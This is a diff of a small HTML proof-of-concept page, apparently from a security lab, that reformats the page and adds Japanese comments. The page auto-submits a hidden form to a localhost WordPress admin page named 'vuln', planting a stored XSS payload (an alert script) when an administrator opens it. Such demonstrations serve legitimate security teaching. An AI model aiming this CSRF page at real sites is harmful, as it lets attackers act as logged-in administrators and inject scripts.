@@ -1,11 +1,23 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="utf-8"><title>CSRF Attack</title></head>
+<head>
+  <meta charset="utf-8">
+  <title>CSRF Attack</title>
+</head>
 <body onload="document.forms[0].submit()">
+  <!-- ページ読み込み時に自動でフォームを送信 -->
   <form action="http://localhost:10090/wp-admin/admin.php?page=vuln" method="POST">
-    <!-- Stored XSS ペイロードを自動投稿 -->
-    <input type="hidden" name="comment" value="<script>alert('CSRF')</script>">
+    <!-- 
+      CSRF攻撃用の隠しフィールド。
+      管理者がこのページを開くだけで、バックスラッシュ除去前のStored XSSペイロードを
+      脆弱プラグインに送信する。
+    -->
+    <input 
+      type="hidden" 
+      name="comment" 
+      value="<script>alert('CSRF')</script>"
+    >
   </form>
-  <p>攻撃中…</p>
+  <p>攻撃中…（このページを開くと自動で投稿されます）</p>
 </body>
 </html>
